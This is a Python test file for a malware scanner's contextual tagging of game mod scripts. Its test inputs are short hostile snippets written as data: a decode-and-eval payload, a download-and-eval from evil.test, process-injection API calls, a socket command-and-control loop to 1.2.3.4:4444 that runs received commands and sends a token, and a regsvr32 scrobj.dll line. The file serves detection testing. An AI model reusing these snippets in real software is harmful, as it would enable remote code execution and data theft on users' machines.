from pathlib import Path

from Virus_Scan.detection.api.chain_evaluation import evaluate_chain_evidence
from Virus_Scan.tests.support.canonical_chain_fixtures import physical_tag_evidence
from Virus_Scan.scanners.pickle.fragment_tags import pickle_fragment_tags
from Virus_Scan.scanners.text_contextual_tags import contextual_tag_scan


def test_scanner_contextual_text_modules_do_not_import_private_detection_contextual_scan():
    offenders = []
    for path in sorted(Path('Virus_Scan/scanners').rglob('*.py')):
        source = path.read_text(encoding='utf-8')
        if 'Virus_Scan.detection.enrichment.strings.contextual.scan' in source:
            offenders.append(path.as_posix())
    assert offenders == []


def test_scanner_owned_contextual_tags_publish_atomic_evidence_and_canonical_chains():
    decoded = set(contextual_tag_scan("var s=atob('AAAA'); eval(s);", path='www/js/plugins/evil.js'))
    assert {'payload_decode_candidate', 'payload_execution', 'script_execution'} <= decoded
    assert 'js_decode_execute_chain' not in decoded
    decoded_evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(sorted(decoded))))
    assert any(
        item.candidate.chain_id == 'probable_payload_execution_chain'
        and item.status == 'candidate'
        for item in decoded_evidence.decisions
    )

    network = set(contextual_tag_scan("var x=new XMLHttpRequest(); x.open('GET','https://evil.test/p.js'); x.onload=function(){ eval(x.responseText); };", path='www/js/plugins/evil.js'))
    assert {'rpgm_js_network_exec_candidate', 'network_download', 'script_execution'} <= network
    assert 'download_execute_chain' not in network
    network_evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(sorted(network))))
    assert any(
        item.candidate.chain_id == 'anchor:rpgm_network_process_execution'
        and item.status == 'candidate'
        for item in network_evidence.decisions
    )

    injection = set(contextual_tag_scan("[DllImport('kernel32')] VirtualAlloc(); CreateRemoteThread(); UnityEngine;", path='Assets/Scripts/NativeInject.cs'))
    assert {'memory_allocate', 'memory_write', 'thread_execution', 'process_injection'} <= injection
    assert 'injection_api_chain' not in injection
    injection_evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(sorted(injection))))
    assert any(
        item.candidate.chain_id == 'anchor:process_injection_chain'
        and item.status == 'candidate'
        for item in injection_evidence.decisions
    )

    c2 = set(contextual_tag_scan("import socket,os\ns=socket.socket(); s.connect(('1.2.3.4',4444)); cmd=s.recv(4096); os.system(cmd); s.send(b'token')", path='game/socket_c2.rpy'))
    assert {'process_exec', 'remote_command_channel', 'network_c2'} <= c2
    assert 'renpy_socket_c2_chain' not in c2
    c2_evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(sorted(c2))))
    assert any(
        item.candidate.chain_id == 'probable_c2_execution_chain'
        and item.status == 'candidate'
        for item in c2_evidence.decisions
    )


def test_pickle_fragment_uses_scanner_owned_contextual_tags():
    tags = pickle_fragment_tags({'text': 'regsvr32.exe scrobj.dll'}, path='game/script.rpy')
    assert 'regsvr32_exec' in tags
